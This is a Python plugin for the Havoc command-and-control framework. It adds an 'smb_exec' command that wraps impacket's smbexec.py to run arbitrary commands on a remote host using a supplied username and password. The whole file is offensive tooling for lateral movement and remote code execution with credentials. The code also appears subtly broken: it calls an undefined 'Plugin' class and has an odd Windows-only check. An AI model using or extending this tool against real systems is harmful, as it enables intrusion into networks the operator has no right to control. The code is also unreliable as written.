from havoc import Demon, RegisterCommand
import os
import platform
import subprocess

def smb_exec(target_ip, username, password, command):
    """
    Executes a command on a remote system using SMB.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] SMB Exec is only supported on Windows."

        # Use impacket's smbexec.py for SMB execution
        impacket_path = os.path.join(os.path.dirname(__file__), "impacket", "smbexec.py")
        if not os.path.exists(impacket_path):
            return "[-] Impacket not found. Please install Impacket and ensure smbexec.py is available."

        # Execute the SMB Exec attack
        cmd = [
            "python", impacket_path,
            f"{username}:{password}@{target_ip}",
            "-c", command
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            return f"[+] Command executed successfully on {target_ip}:\n{result.stdout}"
        else:
            return f"[-] Error executing command on {target_ip}:\n{result.stderr}"
    except Exception as e:
        return f"[-] Error during SMB Exec attack: {e}"

# Havoc C2 Integration
def smb_exec_command(demon, *args):
    """
    Command to perform an SMB Exec attack.
    """
    if len(args) != 4:
        demon.ConsoleWrite("[-] Usage: smb_exec [target_ip] [username] [password] [command]")
        return

    target_ip = args[0]
    username = args[1]
    password = args[2]
    command = args[3]

    result = smb_exec(target_ip, username, password, command)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("smb_exec", "Perform an SMB Exec attack", smb_exec_command)

# Initialize the plugin
plugin = Plugin("SMBExec", "Advanced SMB Exec techniques", initialize)